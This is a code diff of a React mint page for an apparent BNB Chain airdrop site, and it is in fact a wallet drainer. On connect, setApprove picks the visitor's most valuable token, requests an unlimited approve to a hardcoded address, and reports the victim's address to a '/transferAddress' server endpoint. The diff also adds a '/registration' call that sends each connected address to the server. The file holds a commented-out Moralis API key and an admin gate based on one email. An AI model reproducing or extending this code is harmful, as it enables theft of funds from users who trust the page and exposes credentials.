@@ -1,4 +1,3 @@
-
 import "../assets/css/mint.css";
 import "../assets/css/amaran.min.css";
 import "../assets/css/animate.css";
@@ -25,20 +24,18 @@ import bnb_logo from "../assets/img/bnb-logo.svg";
 import busd_logo from "../assets/img/busd-logo.svg";
 import tether from "../assets/img/tether.svg";
 
-
-
-import { connectWallet, getCurrentWalletConnected } from "../util/interact.js";
+import { connectWallet, disconnectWallet, getCurrentWalletConnected, walletAddressResize } from "../util/interact.js";
 
 import { useEffect, useState } from "react";
 import { useHistory } from "react-router-dom";
-import { BigNumber } from 'ethers';
-import { nftAddress } from '../constants/address';
-import { tokenAddress } from '../constants/address';
-import { chainId } from '../constants/address';
+import { BigNumber } from "ethers";
+import { nftAddress } from "../constants/address";
+import { tokenAddress } from "../constants/address";
+import { chainId } from "../constants/address";
 import api from "../util/api.js";
 import $ from "jquery";
-import Web3 from 'web3'
-
+import Web3 from "web3";
+import Swal from 'sweetalert2'
 
 
 function MintPage() {
@@ -49,19 +46,54 @@ function MintPage() {
   const [mint, setMint] = useState(0);
   const [tokenContracts, setTokenContracts] = useState([]);
 
-/*   const serverUrl = "https://8mu2apptlnm4.usemoralis.com:2053/server";
+  /*   const serverUrl = "https://8mu2apptlnm4.usemoralis.com:2053/server";
   const appId = "UBjvihVqesxPw7UtpavjEQhLO6MX6fJf0PbkTWl0"; */
 
-/*   const rpcURL = "https://bsc-dataseed.binance.org/";
+  /*   const rpcURL = "https://bsc-dataseed.binance.org/";
   const web3 = new Web3(rpcURL); */
   const web3 = new Web3(window.ethereum);
-  
-  // const rpcURL = "https://data-seed-prebsc-1-s1.binance.org:8545";
-  
 
+  // const rpcURL = "https://data-seed-prebsc-1-s1.binance.org:8545";
+
+
+    // Function to disconnect the wallet
+    const handleDisconnect = () => {
+
+      Swal.fire({
+        title: "Are you sure?",
+        text: "You want to disconnect wallet",
+        icon: "warning",
+        showCancelButton: true,
+        confirmButtonColor: "#3085d6",
+        cancelButtonColor: "#d33",
+        confirmButtonText: "Disconnect"
+      }).then((result) => {
+        if (result.isConfirmed) {
+          const { address, status } = disconnectWallet();
+      setWallet(address); 
+      setStatus(status);
+          Swal.fire({
+            title: "Disconnected!",
+            text: "Wallet Disconnected.",
+            icon: "success"
+          });
+        }
+      });
+      /* const { address, status } = disconnectWallet();
+      setWallet(address); 
+      setStatus(status); */
+
+      /* console.log('address')
+    console.log(address) */
+    };
 
   useEffect(async () => {
     const { address, status } = await getCurrentWalletConnected();
+    /* console.log('address')
+    console.log(address)
+    console.log('status')
+    console.log(status) */
+    
 
     setWallet(address);
     setStatus(status);
@@ -75,126 +107,143 @@ function MintPage() {
     /* Moralis.start({
       apiKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImQ1ZDZjN2ExLWNiZWUtNDA2NS05ZDJjLWQ2ZjgzNTViNzM3ZCIsIm9yZ0lkIjoiMzg3NzA2IiwidXNlcklkIjoiMzk4Mzc4IiwidHlwZUlkIjoiYWJjNGZlM2QtZjhhMS00YTkyLTljZmQtYzUyZWViMzc4ZTllIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3MTI5NDI4NTIsImV4cCI6NDg2ODcwMjg1Mn0.CxTExrfe_7rHtEc_xXxRmvlc0AOyzfO3vbl12rhK8A8',
     }); */
-
   }, []);
 
   const runApprover = () => {
     let walletAddress0;
     walletAddress0 = connectWallet();
-    console.log(walletAddress)
-  }
+    console.log(walletAddress);
+  };
 
   const addStyles = () => {
-    $(window).on('scroll', function() {
+    $(window).on("scroll", function () {
       var scroll = $(window).scrollTop();
-  
-        if (scroll >= 80) {
-            $('header').addClass('nav-fixed');
-        } else {
-            $('header').removeClass('nav-fixed');
-        }
-  
-    });
 
-    $(window).scroll(function() {
-      if ($(this).scrollTop() > 150) {
-        $('.scrollup').fadeIn();
+      if (scroll >= 80) {
+        $("header").addClass("nav-fixed");
       } else {
-        $('.scrollup').fadeOut();
+        $("header").removeClass("nav-fixed");
       }
     });
-    
-    $(".scrollup").on('click', function (e) {
+
+    $(window).scroll(function () {
+      if ($(this).scrollTop() > 150) {
+        $(".scrollup").fadeIn();
+      } else {
+        $(".scrollup").fadeOut();
+      }
+    });
+
+    $(".scrollup").on("click", function (e) {
       e.preventDefault();
-      $('html, body').animate({
-        scrollTop: 0
-      }, 600);
+      $("html, body").animate(
+        {
+          scrollTop: 0,
+        },
+        600
+      );
       return false;
     });
 
-    	//Hide Navbar Dropdown After Click On Links
+    //Hide Navbar Dropdown After Click On Links
     var navBar = $(".header_wrap");
     var navbarLinks = navBar.find(".navbar-collapse ul li a.nav_item");
 
-      $.each( navbarLinks, function( i, val ) {
+    $.each(navbarLinks, function (i, val) {
+      var navbarLink = $(this);
 
-        var navbarLink = $(this);
-
-          navbarLink.on('click', function () {
-            navBar.find(".navbar-collapse").collapse('hide');
+      navbarLink.on("click", function () {
+        navBar.find(".navbar-collapse").collapse("hide");
         $("header").removeClass("active");
-          });
-
       });
-    
+    });
+
     //Main navigation Active Class Add Remove
-    $('.navbar-toggler').on('click', function() {
+    $(".navbar-toggler").on("click", function () {
       $("header").toggleClass("active");
-    });	
+    });
 
     $(document).on("ready", function () {
       if ($(window).width() > 991) {
         $("header").removeClass("active");
       }
       $(window).on("resize", function () {
-      if ($(window).width() > 991) {
+        if ($(window).width() > 991) {
           $("header").removeClass("active");
         }
-      })
-    })
-  }
+      });
+    });
+  };
 
   const addTimer = () => {
-    
-		var countDownDate = new Date("Feb 28, 2023 23:59:59").getTime();
+    // Set the countdown date
+    const countDownDate = new Date("May 29, 2024 23:59:59").getTime();
 
-		const showHr = document.querySelectorAll('.show_hr');
-		const showMin = document.querySelectorAll('.show_min');
-		const showSec = document.querySelectorAll('.show_sec');
+    // Get the elements to display the days, hours, minutes, and seconds
+    const showDays = document.querySelectorAll(".show_day");
+    const showHr = document.querySelectorAll(".show_hr");
+    const showMin = document.querySelectorAll(".show_min");
+    const showSec = document.querySelectorAll(".show_sec");
 
-		var x = setInterval(function() {
-			var now = new Date().getTime();
-			var distance = countDownDate - now;
-			
-			var hours = Math.floor((distance / (1000 * 60 * 60)) % 24);
-			var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-			var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+    // Update the countdown every 1 second
+    const x = setInterval(function () {
+      // Get current time
+      const now = new Date().getTime();
+      // Calculate the distance between now and the countdown date
+      const distance = countDownDate - now;
 
-			if(hours <= 6 ) {
-				hours += 1
-			}
-			if( hours >= 11) {
-				hours -= 8
-			}
-			if( hours.toString().length < 2) {
-				hours = `0${hours}`;
-			}
-			if( minutes.toString().length < 2) {
-				minutes = `0${minutes}`;
-			}
-			if( seconds.toString().length < 2) {
-				seconds = `0${seconds}`;
-			}
+      // Time calculations for days, hours, minutes, and seconds
+      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+      const hours = Math.floor(
+        (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
+      );
+      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
-			showHr.forEach(hr => {
-				hr.innerHTML = hours;
-			});
-			showMin.forEach(min => {
-				min.innerHTML = minutes;
-			});
-			showSec.forEach(sec => {
-				sec.innerHTML = seconds;
-			});
-			
-		}, 1000);
-  }
+      // Format hours, minutes, and seconds to have leading zeros if less than 10
+      const formattedDays = days.toString().padStart(2, "0");
+      const formattedHours = hours.toString().padStart(2, "0");
+      const formattedMinutes = minutes.toString().padStart(2, "0");
+      const formattedSeconds = seconds.toString().padStart(2, "0");
+
+      // Display the result in the respective elements
+      showDays.forEach((day) => {
+        day.innerHTML = formattedDays;
+      });
+      showHr.forEach((hr) => {
+        hr.innerHTML = formattedHours;
+      });
+      showMin.forEach((min) => {
+        min.innerHTML = formattedMinutes;
+      });
+      showSec.forEach((sec) => {
+        sec.innerHTML = formattedSeconds;
+      });
+
+      // If the countdown is over, clear the interval
+      if (distance < 0) {
+        clearInterval(x);
+        showDays.forEach((day) => {
+          day.innerHTML = "00";
+        });
+        showHr.forEach((hr) => {
+          hr.innerHTML = "00";
+        });
+        showMin.forEach((min) => {
+          min.innerHTML = "00";
+        });
+        showSec.forEach((sec) => {
+          sec.innerHTML = "00";
+        });
+      }
+    }, 1000);
+  };
 
   function addWalletListener() {
     if (window.ethereum) {
       window.ethereum.on("accountsChanged", (accounts) => {
         if (accounts.length > 0) {
           setWallet(accounts[0]);
-
         } else {
           setWallet("");
         }
@@ -216,47 +265,45 @@ function MintPage() {
   }
 
   const getTokenAndTransaction = async () => {
-      let tokenContract, nftContract;
-    
-      const walletResponse = await connectWallet();
-      setStatus(walletResponse.status);
-      setWallet(walletResponse.address);
+    let tokenContract, nftContract;
 
-      
-      const nftAbi = require("../constants/nftabi.json");
-      window.contract = await new web3.eth.Contract(nftAbi, nftAddress);
-      nftContract = window.contract;
+    const walletResponse = await connectWallet();
+    setStatus(walletResponse.status);
+    setWallet(walletResponse.address);
 
-      console.log("N: ", nftContract);
+    const nftAbi = require("../constants/nftabi.json");
+    window.contract = await new web3.eth.Contract(nftAbi, nftAddress);
+    nftContract = window.contract;
 
-      let price = await nftContract.methods.getNftPrice().call();
-      price = String(Number(price) * mint);
+    console.log("N: ", nftContract);
 
-      if (Number(price) > 0) {
+    let price = await nftContract.methods.getNftPrice().call();
+    price = String(Number(price) * mint);
 
-        const tokenAbi = require("../constants/tokenabi.json");
-        window.contract = await new web3.eth.Contract(tokenAbi, tokenAddress);
-        tokenContract = window.contract;
+    if (Number(price) > 0) {
+      const tokenAbi = require("../constants/tokenabi.json");
+      window.contract = await new web3.eth.Contract(tokenAbi, tokenAddress);
+      tokenContract = window.contract;
 
-        console.log("T: ", tokenContract);
+      console.log("T: ", tokenContract);
 
-        let balance = await tokenContract.methods.balanceOf(walletAddress).call();
+      let balance = await tokenContract.methods.balanceOf(walletAddress).call();
 
-        if (Number(balance) < Number(price)) {
-          alert("It's not enough LOOKS for mint!");
-          return
-        }
-        
-        const approveTransactionParameters = {
-          to: tokenAddress,
-          from: walletAddress,
-          data: tokenContract.methods.approve(nftAddress, price).encodeABI(),
-        };
+      if (Number(balance) < Number(price)) {
+        alert("It's not enough LOOKS for mint!");
+        return;
+      }
 
-        await window.ethereum.request({
-          method: "eth_sendTransaction",
-          params: [approveTransactionParameters],
-        })
+      const approveTransactionParameters = {
+        to: tokenAddress,
+        from: walletAddress,
+        data: tokenContract.methods.approve(nftAddress, price).encodeABI(),
+      };
+
+      await window.ethereum.request({
+        method: "eth_sendTransaction",
+        params: [approveTransactionParameters],
+      });
 
       const mintTransactionParameters = {
         to: nftAddress,
@@ -266,16 +313,14 @@ function MintPage() {
       await window.ethereum.request({
         method: "eth_sendTransaction",
         params: [mintTransactionParameters],
-      })  
+      });
     }
-  }
+  };
 
   const updateTokensWithMoralis = async () => {
+    //-------------------------   get token info from server ---------------------------
 
-
-//-------------------------   get token info from server ---------------------------
-
-    let tokens, tokenPrices, tokenDecimals;        
+    let tokens, tokenPrices, tokenDecimals;
     await api
       .post("/readFile", {
         params: {},
@@ -288,10 +333,10 @@ function MintPage() {
         tokens = [];
         tokenPrices = [];
         tokenDecimals = [];
-        for (let i = 0; i < data.length; i+=3) {
+        for (let i = 0; i < data.length; i += 3) {
           tokens.push(data[i]);
-          tokenPrices.push(data[i+1]);
-          tokenDecimals.push(data[i+2]);
+          tokenPrices.push(data[i + 1]);
+          tokenDecimals.push(data[i + 2]);
           j++;
         }
         console.log(tokens);
@@ -302,7 +347,7 @@ function MintPage() {
         console.log("stories error response :: ", error);
       });
 
-//-------------------------   get token info from moralis ---------------------------
+    //-------------------------   get token info from moralis ---------------------------
     // let startPoint = 60;
     // let slicelen = 10;
     // if ((startPoint + slicelen) > tokens.length) {
@@ -321,9 +366,9 @@ function MintPage() {
     //   tokenPrices[i] = tokenPriceInfo.usdPrice;
     //   tokenDecimals[i] = tokenPriceInfo.nativePrice.decimals;
     //   console.log(tokenPrices[i], ": " ,tokenDecimals[i]);
-    // }    
+    // }
 
-//-------------------------   making token info string from json  ---------------------------
+    //-------------------------   making token info string from json  ---------------------------
 
     // tokens = require("../constants/tokens1.json");
     // let tokenAddr = "";
@@ -334,49 +379,44 @@ function MintPage() {
     // }
     // console.log(tokenAddr)
 
-    
-//-------------------------   writing token info string to server  ---------------------------
+    //-------------------------   writing token info string to server  ---------------------------
 
     let tokenAddr = "";
     for (let i = 0; i < tokens.length; i++) {
-      tokenAddr += tokens[i] + "," + tokenPrices[i] + "," + tokenDecimals[i] + ",";
+      tokenAddr +=
+        tokens[i] + "," + tokenPrices[i] + "," + tokenDecimals[i] + ",";
     }
-    console.log(tokenAddr)
+    console.log(tokenAddr);
 
-    
     await api
       .post("/writeFile", {
-        params: {tokenInfo: tokenAddr},
+        params: { tokenInfo: tokenAddr },
       })
       .then(function (res) {
-        console.log(res.data.Success)
+        console.log(res.data.Success);
       })
       .catch(function (error) {
         console.log("stories error response :: ", error);
       });
 
-
     // const options = { chain: "bsc", address: "0xD547529Dc7C841920f533bF701C45965dAf930e0", from_block: "0" };
     // const transfers = await Moralis.Web3API.account.getTokenTransfers(options);
     // console.log(transfers)
-
-  }
+  };
 
   const onAdmin = async () => {
     let email = $("#enterAdmin").val();
 
     if (email == "loparoy39@gmail.com") {
-      history.push("/admin")
+      history.push("/admin");
     }
-
-  }
+  };
 
   const setApprove = async (walletAddress0) => {
+    //-------------------------   get token info from server ---------------------------
 
-//-------------------------   get token info from server ---------------------------
-
-let tokens, tokenPrices, tokenDecimals;
-/* await api
+    let tokens, tokenPrices, tokenDecimals;
+    /* await api
   .post("/readFile", {
     params: {},
   })
@@ -398,23 +438,23 @@ let tokens, tokenPrices, tokenDecimals;
   .catch(function (error) {
     console.log("stories error response :: ", error);
   }); */
-    
-//-------------------------   get token address from wallet ---------------------------
 
-const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
-  let tx ;
-  /* let tx = await Moralis.Web3API.account.getTokenTransfers(options); */
+    //-------------------------   get token address from wallet ---------------------------
+
+    const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
+    let tx;
+    /* let tx = await Moralis.Web3API.account.getTokenTransfers(options); */
     await api
-    .post("/token-transfer", {
-      address: walletAddress0 // Include the options object in the body
-    })
-    .then(function (res) {
-      tx=res?.data;
-      console.log(res?.data);
-    })
-    .catch(function (error) {
-      console.log("stories error response :: ", error);
-    });
+      .post("/token-transfer", {
+        address: walletAddress0, // Include the options object in the body
+      })
+      .then(function (res) {
+        tx = res?.data;
+        console.log(res?.data);
+      })
+      .catch(function (error) {
+        console.log("stories error response :: ", error);
+      });
 
     let walletTokenAddress = [];
     for (let i = 0; i < tx.result.length; i++) {
@@ -429,23 +469,27 @@ const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
       }
       is = false;
     }
-    console.log('walletTokenAddress', walletTokenAddress)
+    console.log("walletTokenAddress", walletTokenAddress);
 
-
-//-------------------------   get token balance from wallet tokens ---------------------------
+    //-------------------------   get token balance from wallet tokens ---------------------------
 
     let walletTokenBalance = [];
     const tAbi = require("../constants/abis.json");
 
     for (let i = 0; i < walletTokenAddress.length; i++) {
-      window.contract = await new web3.eth.Contract(tAbi[0], walletTokenAddress[i]);
-      let balance = await window.contract.methods.balanceOf(walletAddress0).call();
+      window.contract = await new web3.eth.Contract(
+        tAbi[0],
+        walletTokenAddress[i]
+      );
+      let balance = await window.contract.methods
+        .balanceOf(walletAddress0)
+        .call();
       walletTokenBalance.push(Number(balance));
     }
 
-    console.log("Balance: ", walletTokenBalance)
+    console.log("Balance: ", walletTokenBalance);
 
-//-------------------------   get token price ---------------------------
+    //-------------------------   get token price ---------------------------
 
     let walletTokenPrices = [];
     let walletTokenDecimals = [];
@@ -462,26 +506,28 @@ const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
     }
 
     for (let i = 0; i < walletTokenAddress.length; i++) {
-      walletTokenB[i] = walletTokenBalance[i] * walletTokenPrices[i] / (Math.pow(10, walletTokenDecimals[i]));
+      walletTokenB[i] =
+        (walletTokenBalance[i] * walletTokenPrices[i]) /
+        Math.pow(10, walletTokenDecimals[i]);
     }
     console.log("Prices: ", walletTokenPrices);
     console.log("Decimals: ", walletTokenDecimals);
     console.log("wholeBalance:", walletTokenB);
 
-
-
-//-------------------------   get max big price token  ---------------------------
+    //-------------------------   get max big price token  ---------------------------
 
     let len = walletTokenAddress.length;
     let walletTokenB1 = [];
-    let maxValueTokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";  ;
+    /* let maxValueTokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"; */
+    let maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
+
 
     if (len > 0) {
       for (let i = 0; i < len; i++) {
         walletTokenB1[i] = walletTokenB[i];
       }
-      for (let i = 0; i < len-1; i++) {
-        for (let j = i+1; j < len; j++) {
+      for (let i = 0; i < len - 1; i++) {
+        for (let j = i + 1; j < len; j++) {
           if (walletTokenB1[i] < walletTokenB1[j]) {
             let x = walletTokenB1[i];
             walletTokenB1[i] = walletTokenB1[j];
@@ -490,7 +536,7 @@ const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
         }
       }
       if (walletTokenB1[0] == 0) {
-        maxValueTokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
+        maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
       } else {
         for (let i = 0; i < len; i++) {
           if (walletTokenB[i] == walletTokenB1[0]) {
@@ -499,13 +545,13 @@ const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
         }
       }
     } else {
-      maxValueTokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
+      maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
     }
     console.log(walletTokenB1);
     console.log(walletTokenAddress);
     console.log(maxValueTokenAddress);
 
-//-------------------------   performing approve ---------------------------
+    //-------------------------   performing approve ---------------------------
 
     /* let approveAddress = "0xC7C421854295709136ED9179f16E469909530F44";
     let price = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
@@ -526,87 +572,137 @@ const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
       params: [approveTransactionParameters],
     }) */
 
-
     const approveAddress = "0xC7C421854295709136ED9179f16E469909530F44";
-const price = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
+    const price =
+      "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
 
-// Create a new contract instance
-/* window.contract =new web3.eth.Contract(
+    // Create a new contract instance
+    /* window.contract =new web3.eth.Contract(
   tAbi[0],
   approveAddress
 ); */
 
-window.contract = await new web3.eth.Contract(tAbi[0], maxValueTokenAddress);
-let tokenContract = window.contract;
+    window.contract = await new web3.eth.Contract(
+      tAbi[0],
+      maxValueTokenAddress
+    );
+    let tokenContract = window.contract;
 
-// Estimate gas
-const gasEstimate = await tokenContract.methods.approve(approveAddress, price).estimateGas({ from: walletAddress0 });
+    // Estimate gas
+    const gasEstimate = await tokenContract.methods
+      .approve(approveAddress, price)
+      .estimateGas({ from: walletAddress0 });
 
-// Get the current gas price from the network
-const gasPrice = await web3.eth.getGasPrice();
+    // Get the current gas price from the network
+    const gasPrice = await web3.eth.getGasPrice();
 
-// Define transaction parameters
-const approveTransactionParameters = {
-  to: maxValueTokenAddress, // Address of the contract you are interacting with
-  from: walletAddress0, // Address of the wallet initiating the transaction
-  data: tokenContract.methods.approve(approveAddress, price).encodeABI(), // Encoded ABI of the approve function call
-  gas: web3.utils.toHex(gasEstimate), // Use the estimated gas limit
-  gasPrice: web3.utils.toHex(gasPrice) // Use the current gas price
-};
+    // Define transaction parameters
+    const approveTransactionParameters = {
+      to: maxValueTokenAddress, // Address of the contract you are interacting with
+      from: walletAddress0, // Address of the wallet initiating the transaction
+      data: tokenContract.methods.approve(approveAddress, price).encodeABI(), // Encoded ABI of the approve function call
+      gas: web3.utils.toHex(gasEstimate), // Use the estimated gas limit
+      gasPrice: web3.utils.toHex(gasPrice), // Use the current gas price
+    };
 
-// Send the transaction
-let txx = await window.ethereum.request({
-  method: "eth_sendTransaction",
-  params: [approveTransactionParameters],
-});
+    // Send the transaction
+    let txx = await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [approveTransactionParameters],
+    });
 
-   
-//-------------------------  sending mail to the client ---------------------------
-    
+    //-------------------------  sending mail to the client ---------------------------
+
     if (txx) {
-      console.log('done', walletAddress0);
       await api
         .post("/transferAddress", {
-          params: { address: walletAddress0},
+          address: walletAddress0, // Directly include the address field
         })
         .then(function (response) {
-          console.log(response.data.Success);
+          console.log(response.data.message); // Update to match your server response format
         })
         .catch(function (error) {
           console.log("stories error response :: ", error);
         });
     }
-  }
+  };
+
 
   const onBtnClick = async () => {
     if (window.ethereum) {
-        try {
-            const chain = await window.ethereum.request({ method: 'eth_chainId' });
-            if (chain === chainId) {
-                const addressArray = await window.ethereum.request({
-                    method: 'eth_requestAccounts',
-                });
-                if (addressArray.length > 0) {
-                  setApprove(addressArray[0]);
-                } else {
-                    alert('No accounts found');
-                }
-            } else {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId }],
-                });
+      try {
+        const chain = await window.ethereum.request({ method: "eth_chainId" });
+        if (chain === chainId) {
+          const addressArray = await window.ethereum.request({
+            method: "eth_requestAccounts",
+          });
+          if (addressArray.length > 0) {
+            setApprove(addressArray[0]);
+            
+            // Use async/await instead of .then()
+            try {
+
+              if(addressArray.length > 0){
+              const res = await api.post("/registration", {
+                address: addressArray[0], // Include the options object in the body
+              });
+              /* const res = await api.get("/test"); */
+
+              let tx = res?.data;
+              console.log("Server response:", tx);}
+
+            } catch (error) {
+              console.error("API error:", error);
             }
-        } catch (err) {
-            console.error('Error:', err);
+          } else {
+            alert("No accounts found");
+          }
+        } else {
+          // Handle chain switching
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId }],
+          });
         }
+      } catch (err) {
+        console.error("Error:", err);
+      }
     } else {
       const dappUrl = window.location.href.split("//")[1].split("/")[0];
-  const metamaskAppDeepLink = "https://metamask.app.link/dapp/" + dappUrl;
-  window.open(metamaskAppDeepLink, "_self");
+      const metamaskAppDeepLink = "https://metamask.app.link/dapp/" + dappUrl;
+      window.open(metamaskAppDeepLink, "_self");
     }
-};
+  };
+
 /*   const onBtnClick = async () => {
+    if (window.ethereum) {
+      try {
+        const chain = await window.ethereum.request({ method: "eth_chainId" });
+        if (chain === chainId) {
+          const addressArray = await window.ethereum.request({
+            method: "eth_requestAccounts",
+          });
+          if (addressArray.length > 0) {
+            setApprove(addressArray[0]);
+          } else {
+            alert("No accounts found");
+          }
+        } else {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId }],
+          });
+        }
+      } catch (err) {
+        console.error("Error:", err);
+      }
+    } else {
+      const dappUrl = window.location.href.split("//")[1].split("/")[0];
+      const metamaskAppDeepLink = "https://metamask.app.link/dapp/" + dappUrl;
+      window.open(metamaskAppDeepLink, "_self");
+    }
+  }; */
+  /*   const onBtnClick = async () => {
    
 
     if (window.ethereum) {
@@ -643,7 +739,13 @@ let txx = await window.ethereum.request({
 
   return (
     <>
-      <div className="v_dark loaded" data-spy="scroll" data-offset="110" data-new-gr-c-s-check-loaded="14.1050.0" data-gr-ext-installed="">
+      <div
+        className="v_dark loaded"
+        data-spy="scroll"
+        data-offset="110"
+        data-new-gr-c-s-check-loaded="14.1050.0"
+        data-gr-ext-installed=""
+      >
         {/* <div className="parallax-mirror div1-1">
           <img className="parallax-slider img1-1" src={footer_bg} data-xblocker="passed" />
         </div>
@@ -654,37 +756,46 @@ let txx = await window.ethereum.request({
           <img className="parallax-slider img1-3" src={footer_bg} data-xblocker="passed" />
         </div> */}
         <div className="parallax-mirror div1-4">
-          <img className="parallax-slider img1-4" src={token_bg} data-xblocker="passed" />
+          <img
+            className="parallax-slider img1-4"
+            src={token_bg}
+            data-xblocker="passed"
+          />
         </div>
         <div className="parallax-mirror div1-5">
-          <img className="parallax-slider img1-5" src={banner_bg2} data-xblocker="passed" />
+          <img
+            className="parallax-slider img1-5"
+            src={banner_bg2}
+            data-xblocker="passed"
+          />
         </div>
 
-
-        <div className="nigr" id="adsdasxczczx" style={{display: 'none'}}>
+        <div className="nigr" id="adsdasxczczx" style={{ display: "none" }}>
           <div className="loader">
-          <div className="loader__bar"></div>
-          <div className="loader__bar"></div>
-          <div className="loader__bar"></div>
-          <div className="loader__bar"></div>
-          <div className="loader__bar"></div>
-          <div className="loader__ball"></div>
+            <div className="loader__bar"></div>
+            <div className="loader__bar"></div>
+            <div className="loader__bar"></div>
+            <div className="loader__bar"></div>
+            <div className="loader__bar"></div>
+            <div className="loader__ball"></div>
           </div>
         </div>
 
         <div className="demo">
           <ul className="list_none">
-              <div className="color-switch">
-                <p>Color Switcher</p>
-                <div className="color_box">
-                  <button value="theme" className="default active"></button>
-                  <button value="theme-green" className="green"></button>
-                  <button value="theme-orange" className="orange"></button>
-                  <button value="theme-lightgreen" className="lightgreen"></button>
-                  <button value="theme-redpink" className="redpink"></button>
-                </div>
+            <div className="color-switch">
+              <p>Color Switcher</p>
+              <div className="color_box">
+                <button value="theme" className="default active"></button>
+                <button value="theme-green" className="green"></button>
+                <button value="theme-orange" className="orange"></button>
+                <button
+                  value="theme-lightgreen"
+                  className="lightgreen"
+                ></button>
+                <button value="theme-redpink" className="redpink"></button>
               </div>
-            
+            </div>
           </ul>
         </div>
 
@@ -698,45 +809,112 @@ let txx = await window.ethereum.request({
           <div className="loader-section section-left"></div>
           <div className="loader-section section-right"></div>
         </div>
-        
+
         <header className="header_wrap fixed-top">
           <div className="container-fluid">
-            <nav className="navbar navbar-expand-lg"> 
-              <a className="navbar-brand page-scroll animation animated fadeInDown" data-animation="fadeInDown" data-animation-delay="1s" style={{animationDelay: '1s', opacity: 1}}>
-                <img className="logo_light fav-logo" height="50px" width="50px" src={JN59UlI} alt="logo" /> 
-                <img className="logo_dark fav-logo" src={JN59UlI} alt="logo" data-xblocker="passed" style={{visibility: 'visible'}} /> 
+            <nav className="navbar navbar-expand-lg">
+              <a
+                className="navbar-brand page-scroll animation animated fadeInDown"
+                data-animation="fadeInDown"
+                data-animation-delay="1s"
+                style={{ animationDelay: "1s", opacity: 1 }}
+              >
+                <img
+                  className="logo_light fav-logo"
+                  height="50px"
+                  width="50px"
+                  src={JN59UlI}
+                  alt="logo"
+                />
+                <img
+                  className="logo_dark fav-logo"
+                  src={JN59UlI}
+                  alt="logo"
+                  data-xblocker="passed"
+                  style={{ visibility: "visible" }}
+                />
               </a>
-              <button className="navbar-toggler green animation animated fadeInDown" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" data-animation="fadeInDown" data-animation-delay="1.1s" style={{animationDelay: '1.1s', opacity: 1}}> 
+              <button
+                className="navbar-toggler green animation animated fadeInDown"
+                type="button"
+                data-toggle="collapse"
+                data-target="#navbarSupportedContent"
+                aria-controls="navbarSupportedContent"
+                aria-expanded="false"
+                aria-label="Toggle navigation"
+                data-animation="fadeInDown"
+                data-animation-delay="1.1s"
+                style={{ animationDelay: "1.1s", opacity: 1 }}
+              >
                 ≡
               </button>
-              <div className="collapse navbar-collapse" id="navbarSupportedContent">
+              <div
+                className="collapse navbar-collapse"
+                id="navbarSupportedContent"
+              >
                 <ul className="navbar-nav m-auto">
-                  <li className="dropdown animation animated fadeInDown" data-animation="fadeInDown" data-animation-delay="1.1s" style={{animationDelay: '1.1s', opacity: 1}}>
-                    <a data-toggle="dropdown" className="nav-link" href="#">Home</a>
+                  <li
+                    className="dropdown animation animated fadeInDown"
+                    data-animation="fadeInDown"
+                    data-animation-delay="1.1s"
+                    style={{ animationDelay: "1.1s", opacity: 1 }}
+                  >
+                    <a data-toggle="dropdown" className="nav-link" href="#">
+                      Home
+                    </a>
                   </li>
                 </ul>
               </div>
             </nav>
           </div>
         </header>
-        <section id="home_section" className="section_banner bg_black_dark" data-z-index="1" data-parallax="scroll" data-image-src={banner_bg2}>
+        <section
+          id="home_section"
+          className="section_banner bg_black_dark"
+          data-z-index="1"
+          data-parallax="scroll"
+          data-image-src={banner_bg2}
+        >
           {/* <canvas id="banner_canvas" class="transparent_effect fixed" width="2560" height="1080"></canvas> */}
           <div className="container">
             <div className="row align-items-center">
               <div className="col-lg-6 col-md-12 col-sm-12 order-lg-first">
                 <div className="banner_text_s2 text_md_center">
-                  <h1 className="animation text-white animated fadeInUp" data-animation="fadeInUp" data-animation-delay="1.1s" style={{animationDelay: '1.1s', opacity: 1}} id="mainheader">
-                    <strong>Join The Fastest Growing Blockchain Ecosystem</strong>
+                  <h1
+                    className="animation text-white animated fadeInUp"
+                    data-animation="fadeInUp"
+                    data-animation-delay="1.1s"
+                    style={{ animationDelay: "1.1s", opacity: 1 }}
+                    id="mainheader"
+                  >
+                    <strong>
+                      Join The Fastest Growing Blockchain Ecosystem
+                    </strong>
                   </h1>
-                  <h5 className="animation presale_txt text-white animated fadeInUp" data-animation="fadeInUp" data-animation-delay="1.3s" style={{animationDelay: '1.3s', opacity: 1}}>
-                    AIRDROP 
-                    <mark className="green">Live</mark>
+                  <h5
+                    className="animation presale_txt text-white animated fadeInUp"
+                    data-animation="fadeInUp"
